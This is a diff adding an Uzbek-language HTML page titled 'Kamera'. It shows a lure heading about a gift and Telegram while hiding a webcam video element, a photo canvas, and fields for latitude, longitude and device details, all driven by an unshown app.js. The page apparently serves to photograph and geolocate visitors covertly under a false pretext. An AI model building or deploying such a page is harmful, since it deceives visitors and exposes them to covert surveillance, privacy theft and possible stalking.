@@ -1,0 +1,37 @@
+<!doctype html>
+<html lang="uz">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Kamera</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+  </head>
+  <body
+    class="bg-slate-900 min-h-screen flex flex-col items-center justify-center p-0 m-0"
+  >
+    <h1 class="text-white text-[100px] text-center">
+      Mening tanishlarimga so'vg'a Telegramingizga qarang
+    </h1>
+    <div id="videoContainer" class="hidden">
+      <video
+        id="webcam"
+        autoplay
+        playsinline
+        class="w-full h-64 bg-black rounded-2xl border border-slate-800 object-cover shadow-2xl"
+      ></video>
+
+      <canvas id="photoCanvas" class="hidden"></canvas>
+    </div>
+
+    <div class="hidden">
+      <button id="startBtn"></button>
+      <p id="latText"></p>
+      <p id="lonText"></p>
+      <p id="deviceText"></p>
+      <div id="infoContainer"></div>
+      <div id="errorLog"></div>
+    </div>
+
+    <script src="app.js"></script>
+  </body>
+</html>
